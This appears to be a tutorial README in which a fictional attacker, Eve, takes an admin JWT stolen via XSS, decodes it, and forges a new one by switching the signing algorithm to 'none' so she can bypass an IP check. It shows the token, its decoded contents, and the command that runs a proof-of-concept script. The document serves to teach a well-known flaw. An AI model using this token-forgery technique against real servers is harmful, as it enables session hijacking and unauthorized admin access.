# Eve is an evil attacker

## Admin website break-in

Let's say Eve stole a cookie from the admin user with an XSS somewhere.
```
auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXAiOiI5MS4xODIuMjM3LjI0NyIsImlhdCI6MTUyODk4MzI3NX0.TocbMpx0DrAW6r-gpOg_7ycMU3l0ar3f4smD2VQh9PA
```

Eve inserts the cookie into its own browser and tries to access to https://bob-cloud-computing.tk/admin but receives some bad news : the server greets Eve with `Bad ip`. Humm.

Eve realizes that it's a JWT (Json Web Token) so she decodes it with https://jwt.io/

The header is :
```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

And the body :
```json
{
  "username": "admin",
  "ip": "91.182.237.247",
  "iat": 1528983275
}
```

Oh, that's where the IP comes from !

The bad news is that Eve can't forge a new version of this token with its own
ip because Eve doesn't know the secret used by the server for the HMAC (`"alg": "HS256"`) :/

But what Eve you changed the algorithm from `HS256` to `none` ? Would the server
accepts the algorithm from the header instead of a fixed value on its side ?
It's worth a try !

Eve then writes a short js PoC (`/poc.js`) that decodes the JWT, changes the ip
and signs it with the `none` algorithm. Eve then makes an http request to the
vulnerable server and ...

(Eve might want to `npm install` before running this command)

``` bash
./poc.js eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXAiOiI5MS4xODIuMjM3LjI0NyIsImlhdCI6MTUyODk4MzI3NX0.TocbMpx0DrAW6r-gpOg_7ycMU3l0ar3f4smD2VQh9PA 1.1.1.1
```

Voila !
